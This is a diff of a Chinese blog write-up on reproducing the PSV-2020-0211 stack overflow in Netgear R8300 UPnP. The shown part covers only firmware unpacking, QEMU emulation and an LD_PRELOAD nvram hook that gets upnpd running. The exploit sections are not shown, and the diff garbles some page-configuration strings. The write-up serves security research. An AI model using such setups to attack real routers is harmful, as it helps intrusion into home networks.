@@ -14,10 +14,10 @@
 
   
 
-  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":100,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"澶嶅埗鎴愬姛(*^鈻絕*)","fail":"澶嶅埗澶辫触 (锞熲娍锞?锞?","copyright":{"enable":false,"count":100,"content":"鏈枃鐗堟潈锛氭湰鍗氬鎵€鏈夋枃绔犻櫎鐗瑰埆澹版槑澶栵紝鍧囬噰鐢?BY-NC-SA 璁稿彲鍗忚銆傝浆杞借娉ㄦ槑鍑哄锛?"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
   
   <title>
-    PSV-2020-0211 |
+    PSV-2020-0211 栈溢出漏洞 |
     
     Hexo
   </title>
@@ -37,7 +37,7 @@
   
     <meta name="description" content="PSV-2020-0211:Netgear R8300 UPnP 栈溢出漏洞| 0 | 前言本次的漏洞复现比较特殊的是环境搭建中的 hook操作,属于 iot安全研究中一个很巧妙的手法 我通过这个漏洞展现一个如何通过 hook绕过一些硬件的检测 | 1 | 环境搭建1.1 下载官方提供了固件的下载,根据官网漏洞报告于 V1.0.2.134 中修复了该漏洞,所以可以选取任意之前的版本,我选择的是 V">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PSV-2020-0211">
+<meta property="og:title" content="PSV-2020-0211 栈溢出漏洞">
 <meta property="og:url" content="https://khighl.github.io.git/2025/07/10/PSV-2020-0211%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="PSV-2020-0211:Netgear R8300 UPnP 栈溢出漏洞| 0 | 前言本次的漏洞复现比较特殊的是环境搭建中的 hook操作,属于 iot安全研究中一个很巧妙的手法 我通过这个漏洞展现一个如何通过 hook绕过一些硬件的检测 | 1 | 环境搭建1.1 下载官方提供了固件的下载,根据官网漏洞报告于 V1.0.2.134 中修复了该漏洞,所以可以选取任意之前的版本,我选择的是 V">
@@ -45,16 +45,11 @@
 <meta property="og:image" content="https://khighl.github.io.git/images/PSV-2020-0211%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1752111718206.png">
 <meta property="og:image" content="https://khighl.github.io.git/images/PSV-2020-0211%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1752126406576.png">
 <meta property="og:image" content="https://khighl.github.io.git/images/PSV-2020-0211%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1752115479640.png">
-<meta property="og:image" content="https://khighl.github.io.git/images/PSV-2020-0211%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1752116148142.png">
-<meta property="og:image" content="https://khighl.github.io.git/images/PSV-2020-0211%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1752116301959.png">
-<meta property="og:image" content="https://khighl.github.io.git/images/PSV-2020-0211%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1752116740010.png">
 <meta property="og:image" content="https://khighl.github.io.git/images/PSV-2020-0211%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1752117588371.png">
 <meta property="og:image" content="https://khighl.github.io.git/images/PSV-2020-0211%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1752119616213.png">
 <meta property="article:published_time" content="2025-07-09T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-07-10T05:53:51.407Z">
+<meta property="article:modified_time" content="2026-03-24T01:55:12.661Z">
 <meta property="article:author" content="zer00ne">
-<meta property="article:tag" content="安全">
-<meta property="article:tag" content="iot漏洞复现">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://khighl.github.io.git/images/PSV-2020-0211%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1752111718206.png">
   
@@ -101,7 +96,7 @@
           </svg>
         
       </div>
-      <div class="loading-word">少女祈祷中...</div>
+      <div class="loading-word">灏戝コ绁堢シ涓?..</div>
     </div>
   </div>
   </div>
@@ -188,7 +183,7 @@
           
         </picture>
         
-          <img  fetchpriority="high" src="/images/banner.webp" alt="PSV-2020-0211">
+          <img  fetchpriority="high" src="/images/banner.webp" alt="PSV-2020-0211 栈溢出漏洞">
         
       
     
@@ -199,7 +194,7 @@
         
         
           <a href="/" id="logo">
-            <h1 data-aos="slide-up">PSV-2020-0211</h1>
+            <h1 data-aos="slide-up">PSV-2020-0211 栈溢出漏洞</h1>
           </a>
         
       
@@ -226,7 +221,7 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PSV-2020-0211-Netgear-R8300-UPnP-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">PSV-2020-0211:Netgear R8300 UPnP 栈溢出漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">| 0 | 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">| 1 | 环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.1 下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%8C%85"><span class="toc-number">1.2.2.</span> <span class="toc-text">解包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.2.3.</span> <span class="toc-text">qemu模拟</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hook%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.4.</span> <span class="toc-text">hook操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nvram%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">nvram是什么</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hook%E6%B5%81%E7%A8%8B%E7%9A%84%E6%A2%B3%E7%90%86"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">Hook流程的梳理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">| 2 | 逆向分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-EXP%E7%BC%96%E5%86%99"><span class="toc-number">1.4.</span> <span class="toc-text">| 3 | EXP编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%9C%80%E7%BB%88EXP"><span class="toc-number">1.5.</span> <span class="toc-text">| 4 | 最终EXP</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PSV-2020-0211-Netgear-R8300-UPnP-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">PSV-2020-0211:Netgear R8300 UPnP 栈溢出漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">| 0 | 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">| 1 | 环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.1 下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%8C%85"><span class="toc-number">1.2.2.</span> <span class="toc-text">解包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#qemu%E6%A8%A1%E6%8B%9F"><span class="toc-number">1.2.3.</span> <span class="toc-text">qemu模拟</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hook%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.4.</span> <span class="toc-text">hook操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nvram%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">nvram是什么</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hook%E6%B5%81%E7%A8%8B%E7%9A%84%E6%A2%B3%E7%90%86"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">Hook流程的梳理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">| 2 | 逆向分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%9C%80%E7%BB%88EXP"><span class="toc-number">1.4.</span> <span class="toc-text">| 4 | 最终EXP</span></a></li></ol></li></ol>
       
   </div>
 </div>
@@ -239,15 +234,15 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">24</div>
+    <div class="sidebar-state-number">25</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">2</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">9</div>
+    <div class="sidebar-state-number">0</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -316,11 +311,15 @@
       <div class="article-date">
   <span class="article-date-link" data-aos="zoom-in">
     <time datetime="2025-07-09T16:00:00.000Z" itemprop="datePublished">2025-07-10</time>
-    <time style="display: none;" id="post-update-time">2025-07-10</time>
+    <time style="display: none;" id="post-update-time">2026-03-24</time>
   </span>
 </div>
 
       
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/ctf/" data-aos="zoom-in">ctf</a>
+  </div>
+
 
     </div>
     <div class="hr-line"></div>
@@ -329,77 +328,80 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <h1 id="PSV-2020-0211-Netgear-R8300-UPnP-栈溢出漏洞"><a href="#PSV-2020-0211-Netgear-R8300-UPnP-栈溢出漏洞" class="headerlink" title="PSV-2020-0211:Netgear R8300 UPnP 栈溢出漏洞"></a>PSV-2020-0211:Netgear R8300 UPnP 栈溢出漏洞</h1><h2 id="0-前言"><a href="#0-前言" class="headerlink" title="| 0 | 前言"></a>| 0 | 前言</h2><p>本次的漏洞复现比较特殊的是环境搭建中的 <code>hook</code>操作,属于 <code>iot</code>安全研究中一个很巧妙的手法</p>
-<p>我通过这个漏洞展现一个如何通过 <code>hook</code>绕过一些硬件的检测</p>
-<h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="| 1 | 环境搭建"></a>| 1 | 环境搭建</h2><h3 id="1-1-下载"><a href="#1-1-下载" class="headerlink" title="1.1 下载"></a>1.1 下载</h3><p>官方提供了固件的下载,根据官网漏洞报告于 <code>V1.0.2.134</code> 中修复了该漏洞,所以可以选取任意之前的版本,我选择的是 <code>V1.0.2.130</code></p>
+        <h1 id="PSV-2020-0211-Netgear-R8300-UPnP-栈溢出漏洞"><a href="#PSV-2020-0211-Netgear-R8300-UPnP-栈溢出漏洞" class="headerlink" title="PSV-2020-0211:Netgear R8300 UPnP 栈溢出漏洞"></a>PSV-2020-0211:Netgear R8300 UPnP 栈溢出漏洞</h1><h2 id="0-前言"><a href="#0-前言" class="headerlink" title="| 0 | 前言"></a>| 0 | 前言</h2><p>本次的漏洞复现比较特殊的是环境搭建中的 hook操作,属于 iot安全研究中一个很巧妙的手法</p>
+<p>我通过这个漏洞展现一个如何通过 hook绕过一些硬件的检测</p>
+<h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="| 1 | 环境搭建"></a>| 1 | 环境搭建</h2><h3 id="1-1-下载"><a href="#1-1-下载" class="headerlink" title="1.1 下载"></a>1.1 下载</h3><p>官方提供了固件的下载,根据官网漏洞报告于 V1.0.2.134 中修复了该漏洞,所以可以选取任意之前的版本,我选择的是 V1.0.2.130</p>
 <p>下载地址 : <a target="_blank" rel="noopener" href="https://www.netgear.com/support/product/r8300/#download">netgear R8300</a></p>
-<h3 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h3><p>依旧使用 <code>binwalk</code>解包</p>
+<h3 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h3><p>依旧使用 binwalk解包</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e --preserve-symlinks R8300-V1.0.2.130_1.0.99.chk </span><br></pre></td></tr></table></figure>
 
-<p>可以得到两个文件系统(<code>squashfs-root</code>与 <code>squashfs-root-0</code>),我们任意选择一个使用</p>
-<h3 id="qemu模拟"><a href="#qemu模拟" class="headerlink" title="qemu模拟"></a>qemu模拟</h3><p>我选择使用<strong>qemu</strong>的 <code>system</code>仿真模拟 <code>upnpd</code>服务</p>
-<p>我们首先需要从 <a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/armhf/" title="Debian 官网">Debian 官网</a> 下载内核，磁盘文件及镜像文件：</p>
-<p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress" title="vmlinuz-3.2.0-4-vexpress">vmlinuz-3.2.0-4-vexpress</a></p>
-<p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress" title="initrd.img-3.2.0-4-vexpress">initrd.img-3.2.0-4-vexpress</a></p>
-<p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2" title="debian_wheezy_armhf_standard.qcow2">debian_wheezy_armhf_standard.qcow2</a></p>
+<p>可以得到两个文件系统(squashfs-root与 squashfs-root-0),我们任意选择一个使用</p>
+<h3 id="qemu模拟"><a href="#qemu模拟" class="headerlink" title="qemu模拟"></a>qemu模拟</h3><p>我选择使用qemu的 system仿真模拟 upnpd服务</p>
+<p>我们首先需要从 <a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/armhf/">Debian 官网</a> 下载内核，磁盘文件及镜像文件：</p>
+<p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress">vmlinuz-3.2.0-4-vexpress</a></p>
+<p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress">initrd.img-3.2.0-4-vexpress</a></p>
+<p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2">debian_wheezy_armhf_standard.qcow2</a></p>
 <p>将这三个文件放在同一路径下,并创建启动脚本</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">TAP接口配置</span></span><br><span class="line">TAP_IF=&quot;tap0&quot;</span><br><span class="line">BR_IF=&quot;br0&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">确保 tap0 存在，并添加进 br0</span></span><br><span class="line">sudo ip tuntap add dev $TAP_IF mode tap</span><br><span class="line">sudo ip link set $TAP_IF up</span><br><span class="line">sudo brctl addif $BR_IF $TAP_IF</span><br><span class="line"></span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line">    -M vexpress-a9 \</span><br><span class="line">    -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">    -initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">    -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line">    -net nic \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>
 
-<p>使用<code>scp</code>目命令将文件系统传送到<code>qemu</code>中</p>
-<h3 id="hook操作"><a href="#hook操作" class="headerlink" title="hook操作"></a>hook操作</h3><p>我们直接在<code>qemu</code>使用<code>chroot</code>以使用固件的文件系统</p>
+<p>使用scp目命令将文件系统传送到qemu中</p>
+<h3 id="hook操作"><a href="#hook操作" class="headerlink" title="hook操作"></a>hook操作</h3><p>我们直接在qemu使用chroot以使用固件的文件系统</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd squashfs-root/</span><br><span class="line">chroot . sh</span><br></pre></td></tr></table></figure>
 
-<p>运行<code>upnpd</code>,可以得到报错</p>
+<p>运行upnpd,可以得到报错</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&quot;/var/run/upnpd.pid&quot;,O_RDWR|O_CREAT|O_TRUNC,0666) = -1 errno=2 (No such file or directory)</span><br></pre></td></tr></table></figure>
 
-<p>于是我们在创建<code>temp/var/run</code>路径,再次运行<code>upnpd</code>,得到报错</p>
+<p>于是我们在创建temp&#x2F;var&#x2F;run路径,再次运行upnpd,得到报错</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./usr/sbin/upnpd</span></span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">/dev/nvram: No such file or directory</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
 
-<p>这里提示我们的<code>dev</code>中缺少<code>nvram</code></p>
+<p>这里提示我们的dev中缺少nvram</p>
 <h4 id="nvram是什么"><a href="#nvram是什么" class="headerlink" title="nvram是什么"></a>nvram是什么</h4><blockquote>
-<p><strong>NVRAM &#x3D; Non-Volatile RAM（非易失性内存）</strong>，<br>它是一种即使断电数据也不会丢失的“配置存储地”。<br>在很多路由器、交换机、IoT设备中，它专门用来存储设备的配置信息，比如 IP 地址、WiFi 密码、管理后台账号、MAC 地址等等。</p>
+<p>NVRAM &#x3D; Non-Volatile RAM（非易失性内存），<br>它是一种即使断电数据也不会丢失的“配置存储地”。<br>在很多路由器、交换机、IoT设备中，它专门用来存储设备的配置信息，比如 IP 地址、WiFi 密码、管理后台账号、MAC 地址等等。</p>
 </blockquote>
-<p>可以看到在<code>upnpd</code>中对这些函数都有调用</p>
+<p>可以看到在upnpd中对这些函数都有调用</p>
 <p><img src="/images/PSV-2020-0211%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/1752111718206.png" alt="1752111718206"></p>
-<p><code>nvram</code>所处的区域一般都与硬件有关</p>
+<p>nvram所处的区域一般都与硬件有关</p>
 <ul>
-<li>独立的分区（比如 <code>mtdblock2</code>）</li>
-<li>某个 NVRAM 芯片</li>
-<li>某种 flash 的最后一个块（比如 CFE NVRAM header）</li>
+<li><p>独立的分区（比如 mtdblock2）</p>
+</li>
+<li><p>某个 NVRAM 芯片</p>
+</li>
+<li><p>某种 flash 的最后一个块（比如 CFE NVRAM header）</p>
+</li>
 </ul>
-<p>但是我们的<code>qemu</code>仿真肯定没有硬件设备,所以我们要想一个方法使得这些函数不会进行硬件操作</p>
+<p>但是我们的qemu仿真肯定没有硬件设备,所以我们要想一个方法使得这些函数不会进行硬件操作</p>
 <blockquote>
-<p><strong>Linux在运行动态链接程序时，会优先使用 <code>LD_PRELOAD</code> 指定的动态库中的函数</strong>，<strong>如果这个库中定义了和系统库&#x2F;程序中同名的函数，就会”覆盖”掉原来的实现</strong>，从而实现”hook”的效果</p>
+<p>Linux在运行动态链接程序时，会优先使用 LD_PRELOAD 指定的动态库中的函数，如果这个库中定义了和系统库&#x2F;程序中同名的函数，就会”覆盖”掉原来的实现，从而实现”hook”的效果</p>
 </blockquote>
-<p>如果我们有一个包含所有所需<code>Nvram</code>函数的<code>.so</code>文件,并使用<code>LD_PRELOAD</code>对<code>upnpd</code>进行加载,那运行<code>upnpd</code>时所有<code>Nvram</code>的调用就会被劫持到我们的<code>.so</code>文件中,实现对硬件检查的绕过</p>
-<p>通过<code>readfile</code>我们找到<code>upnpd</code>所依赖的库</p>
+<p>如果我们有一个包含所有所需Nvram函数的.so文件,并使用LD_PRELOAD对upnpd进行加载,那运行upnpd时所有Nvram的调用就会被劫持到我们的.so文件中,实现对硬件检查的绕过</p>
+<p>通过readfile我们找到upnpd所依赖的库</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">zer00ne@zer00ne:~/Desktop/cve_review/stage1/netgear/_R8300-V1.0.2.130_1.0.99.chk.extracted/squashfs-root$ readelf -d ./upnpd </span><br><span class="line">Dynamic section at offset 0x4500c contains 29 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libnvram.so]</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libacos_shared.so]</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libnat.so]</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libcrypt.so.0]</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libgcc_s.so.1]</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.0]</span><br></pre></td></tr></table></figure>
 
-<p>说明<code>upnpd</code>使用的是<code>uclibc</code>,而我们编写的<code>.so</code>(<code>hook</code>)也必须使用<code>uclibc</code>进行动态链接或静态链接</p>
-<p>我选择在网上下载对应架构的<a target="_blank" rel="noopener" href="https://toolchains.bootlin.com/"><code>gcc</code>工具链</a><code>编译.so</code>,刚刚好网上有现成的<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c">hook源码</a></p>
+<p>说明upnpd使用的是uclibc,而我们编写的.so(hook)也必须使用uclibc进行动态链接或静态链接</p>
+<p>我选择在网上下载对应架构的<a target="_blank" rel="noopener" href="https://toolchains.bootlin.com/">gcc工具链</a>编译.so,刚刚好网上有现成的<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c">hook源码</a></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arm-linux-gcc -Wall -fPIC -shared custom_nvram_r6250.c -o nvram.so</span><br></pre></td></tr></table></figure>
 
-<p>将这个传送到<code>qemu</code>中,使用<code>LD_PRELOAD</code>加载<code>nvram.so</code>,依旧报错,已经解决了<code>nvarm</code>的问题了</p>
+<p>将这个传送到qemu中,使用LD_PRELOAD加载nvram.so,依旧报错,已经解决了nvarm的问题了</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">LD_PRELOAD=<span class="string">&quot;./nvram.so&quot;</span> ./usr/sbin/upnpd</span></span><br><span class="line"></span><br><span class="line">./usr/sbin/upnpd: symbol &#x27;dlsym&#x27;: can&#x27;t resolve symbol</span><br></pre></td></tr></table></figure>
 
-<p><code>nvram.so</code> 中用了 <code>dlsym</code>，但运行时无法解析 <code>dlsym</code> 的符号，说明当前运行环境缺少 <strong>动态链接库(ld)或动态链接器不兼容</strong></p>
-<p>我们对<code>dlsym</code>进行搜索得到<code>/lib/libdl.so.0</code>,该动态链接库导出了该符号</p>
+<p>nvram.so 中用了 dlsym，但运行时无法解析 dlsym 的符号，说明当前运行环境缺少 动态链接库(ld)或动态链接器不兼容</p>
+<p>我们对dlsym进行搜索得到&#x2F;lib&#x2F;libdl.so.0,该动态链接库导出了该符号</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@debian-armhf:~/squashfs-root# readelf -a lib/libdl.so.0 | grep dlsym</span><br><span class="line">    26: 000010f0   296 FUNC    GLOBAL DEFAULT    7 dlsym</span><br></pre></td></tr></table></figure>
 
-<p>最后我们以<code>LD_PRELOAD=&quot;./nvram.so ./lib/libdl.so.0&quot; ./usr/sbin/upnpd</code>运行,但仍然报错</p>
+<p>最后我们以LD_PRELOAD&#x3D;”.&#x2F;nvram.so .&#x2F;lib&#x2F;libdl.so.0” .&#x2F;usr&#x2F;sbin&#x2F;upnpd运行,但仍然报错</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[0x3ff60cb8] fopen(&#x27;/tmp/nvram.ini&#x27;, &#x27;r&#x27;) = 0x00000000</span><br><span class="line">Cannot open /tmp/nvram.ini</span><br></pre></td></tr></table></figure>
 
-<p>我们需要手动修复<code>nvram.ini</code>文件,<a target="_blank" rel="noopener" href="https://github.com/zcutlip/nvramfaker/blob/master/nvram.ini]https://github.com/zcutlip/nvram-faker/blob/master/nvram.ini">修复文件</a></p>
+<p>我们需要手动修复nvram.ini文件,<a target="_blank" rel="noopener" href="https://github.com/zcutlip/nvramfaker/blob/master/nvram.ini]https://github.com/zcutlip/nvram-faker/blob/master/nvram.ini">修复文件</a></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">upnpd_debug_level=9(日志等级,可以适当调低)</span><br><span class="line">lan_ipaddr=192.168.100.2(用户模拟对应本机ip，qemu对应qemu的ip)</span><br><span class="line">hwver=R8500(设备版本)</span><br><span class="line">friendly_name=R8300(用户在设备列表中看到的名字)</span><br><span class="line">upnp_enable=1(开启upnpd功能)</span><br><span class="line">upnp_turn_on=1(与 upnp_enable 配合使用，双开才会启动 upnpd)</span><br><span class="line">upnp_advert_period=30(PnP 服务向局域网广播 NOTIFY 消息的周期,单位:秒.)</span><br><span class="line">upnp_advert_ttl=4(这条广播最多可以被路由器转发 4 次)</span><br><span class="line">upnp_portmap_entry=1(允许端口映射功能)</span><br><span class="line">upnp_duration=3600(端口映射条目的有效时长,单位:秒.)</span><br><span class="line">upnp_DHCPServerConfigurable=1(UPnP允许修改 DHCP 服务器的配置)</span><br><span class="line">wps_is_upnp=0(禁用通过 UPnP 暴露 WPS 功能)</span><br><span class="line">upnp_sa_uuid=00000000000000000000(UPnP 服务设备的 UUID)</span><br><span class="line">lan_hwaddr=AA:BB:CC:DD:EE:FF(LAN 接口的 MAC 地址)</span><br></pre></td></tr></table></figure>
 
-<p>此时再运行<code>LD_PRELOAD=&quot;./nvram.so ./lib/libdl.so.0&quot; ./usr/sbin/upnpd</code></p>
+<p>此时再运行LD_PRELOAD&#x3D;”.&#x2F;nvram.so .&#x2F;lib&#x2F;libdl.so.0” .&#x2F;usr&#x2F;sbin&#x2F;upnpd</p>
